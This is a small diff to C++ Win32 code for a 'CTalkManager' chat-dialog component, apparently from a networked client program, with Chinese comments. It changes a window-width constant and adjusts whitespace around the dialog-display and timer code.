@@ -15,7 +15,7 @@ using namespace std;
 #define ID_TIMER_DELAY_DISPLAY	2 
 #define ID_TIMER_CLOSE_WINDOW	3 
 
-#define WIN_WIDTH		250   
+#define WIN_WIDTH		360   
 #define WIN_HEIGHT		200
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -54,7 +54,6 @@ VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			memcpy(g_Buffer, szBuffer, ulLength);
 			//创建一个DLG
-
 			DialogBox(g_hInstance,MAKEINTRESOURCE(IDD_DIALOG),
 				NULL,DialogProc);  //SDK   C   MFC  C++
 			break;
@@ -126,7 +125,7 @@ VOID CTalkManager::OnDlgTimer(HWND hDlg)   //时钟回调
 			{
 				KillTimer(hDlg,ID_TIMER_CLOSE_WINDOW);
 				BYTE bToken = TOKEN_TALKCMPLT;				// 包含头文件 Common.h     
-				g_IOCPClientObject->OnServerSending((char*)&bToken, 1);		// 发送允许重新发送的指令
+				g_IOCPClientObject->OnServerSending((char*)&bToken, 1); // 发送允许重新发送的指令
 				EndDialog(hDlg,0);
 			}
 			break;
